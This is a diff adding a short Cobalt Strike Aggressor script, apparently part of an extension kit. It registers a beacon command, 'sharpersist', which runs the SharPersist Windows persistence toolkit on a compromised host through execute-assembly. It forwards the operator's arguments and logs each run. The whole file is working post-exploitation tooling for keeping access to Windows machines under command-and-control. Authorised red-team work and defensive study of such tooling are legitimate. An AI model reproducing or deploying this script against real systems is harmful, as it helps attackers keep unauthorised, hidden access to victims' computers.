@@ -1,0 +1,19 @@
+beacon_command_register("sharpersist", "Windows persistence toolkit written in C#",
+	"Usage: sharpersist [arguments]\n\n" .
+	"Uses execute-assembly to run the assembly and takes given arguments\n");
+alias sharpersist{
+	local('$bid $asm $desc @args $argu');
+	$bid = $1;
+	$asm = "/opt/cobalt_strike_extension_kit/exe/SharPersist.exe";
+	$desc = "SharPersist";
+	@args = @_;
+	remove(@args, $bid);
+	$argu = join(' ', @args);
+	if ($argu eq ""){
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
+	}
+	else{
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
+	}
+	bexecute_assembly!($bid, $asm, $argu);
+}
